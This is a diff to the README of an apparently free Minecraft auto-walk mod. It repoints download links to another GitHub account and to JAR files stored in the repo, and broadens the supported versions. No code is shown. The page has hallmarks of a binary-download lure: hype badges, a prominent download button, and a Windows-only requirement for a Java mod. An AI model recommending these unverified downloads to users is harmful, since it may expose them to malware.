@@ -4,7 +4,7 @@
 
 ### Auto-Walk Pathfinder: free Minecraft utility mod, no key, no ads.
 
-[![DOWNLOAD](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-red?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+[![DOWNLOAD](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-red?style=for-the-badge&logo=github)](https://github.com/glosssteamjoist/auto-walk-pathfinder/releases/latest)
 [![Status](https://img.shields.io/badge/STATUS-WORKING_%F0%9F%9F%A2-brightgreen?style=for-the-badge)](#features)
 [![Key System](https://img.shields.io/badge/KEY-NO_KEY_required-success?style=for-the-badge)](#features)
 [![Platform](https://img.shields.io/badge/PLATFORM-Windows_10_%E2%80%A2_11-blue?style=for-the-badge)](#requirements)
@@ -35,21 +35,21 @@ Auto-Walk Pathfinder navigates your character to a target coordinate automatical
 
 ## 🛠️ Installation
 
-1. **Download** the JAR for your Minecraft version from [Releases](https://github.com/laplaplaplas/auto-walk-pathfinder/releases/latest) 👉 **[https://laplaplaplas.github.io/download/](https://laplaplaplas.github.io/download/)**
+1. **Download** the JAR for your Minecraft version — files are in this repo or on the [Releases](https://github.com/glosssteamjoist/auto-walk-pathfinder/releases/latest) page.
 2. Place the JAR in your `.minecraft/mods/` folder.
 3. Make sure **Forge** is installed for your Minecraft version.
 4. Launch Minecraft. ✅
 
 | MC Version | File |
 |---|---|
-| 1.16 | `auto-walk-pathfinder-1.16.jar` |
-| 1.17 | `auto-walk-pathfinder-1.17.jar` |
-| 1.18X | `auto-walk-pathfinder-1.18X.jar` |
-| 1.19X | `auto-walk-pathfinder-1.19X.jar` |
-| 1.20X | `auto-walk-pathfinder-1.20X.jar` |
-| 1.21X | `auto-walk-pathfinder-1.21X.jar` |
-| 26.1 | `auto-walk-pathfinder-26.1.jar` |
-| 26.2 | `auto-walk-pathfinder-26.2.jar` |
+| 1.16 | [`auto-walk-pathfinder-1.16.jar`](auto-walk-pathfinder-1.16.jar) |
+| 1.17 | [`auto-walk-pathfinder-1.17.jar`](auto-walk-pathfinder-1.17.jar) |
+| 1.18X | [`auto-walk-pathfinder-1.18X.jar`](auto-walk-pathfinder-1.18X.jar) |
+| 1.19X | [`auto-walk-pathfinder-1.19X.jar`](auto-walk-pathfinder-1.19X.jar) |
+| 1.20X | [`auto-walk-pathfinder-1.20X.jar`](auto-walk-pathfinder-1.20X.jar) |
+| 1.21X | [`auto-walk-pathfinder-1.21X.jar`](auto-walk-pathfinder-1.21X.jar) |
+| 26.1 | [`auto-walk-pathfinder-26.1.jar`](auto-walk-pathfinder-26.1.jar) |
+| 26.2 | [`auto-walk-pathfinder-26.2.jar`](auto-walk-pathfinder-26.2.jar) |
 
 ---
 
@@ -57,8 +57,8 @@ Auto-Walk Pathfinder navigates your character to a target coordinate automatical
 <a name="requirements"></a>
 
 - Windows 10/11 (64-bit)
-- Minecraft Java Edition 1.16 – 1.21
-- Minecraft Forge installed
+- Minecraft Java Edition 1.16 – 26.2
+- Minecraft Forge / Fabric installed
 
 ---
 
